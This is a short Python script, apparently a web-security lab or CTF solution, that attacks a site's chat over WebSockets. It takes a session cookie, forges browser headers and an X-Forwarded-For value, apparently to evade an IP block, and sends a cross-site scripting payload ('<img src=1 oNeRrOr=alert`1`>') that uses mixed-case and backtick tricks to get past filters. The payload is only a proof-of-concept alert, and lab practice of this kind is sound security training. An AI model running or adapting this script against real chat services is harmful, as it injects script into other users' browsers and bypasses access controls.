import asyncio
import sys
import websockets
import requests

async def send_message(uri, message, headers):
    async with websockets.connect(uri, extra_headers=headers) as websocket:
        await websocket.send(message)
        print(f"Sent: {message}")
        response = await websocket.recv()
        print(f"Received: {response}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    base_url = sys.argv[1]

    websocket_url = "wss://" + base_url[8:].rstrip("/") + "/chat"
    response = requests.get(base_url)

    cookies = response.cookies.get_dict()
    session_cookie = cookies.get('session')

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Accept-Language": "pl,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-WebSocket-Version": "13",
        "Origin": base_url,
        "Sec-WebSocket-Key": "eTJaTXmPk0ij7WBTppx+wA==",
        "Connection": "keep-alive, Upgrade",
        "Cookie": f"session={session_cookie}",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "websocket",
        "Sec-Fetch-Site": "same-origin",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Upgrade": "websocket",
        "X-Forwarded-For": "1.1.1.1"
    }

    message = '<img src=1 oNeRrOr=alert`1`>'

    asyncio.get_event_loop().run_until_complete(send_message(websocket_url, message, headers))
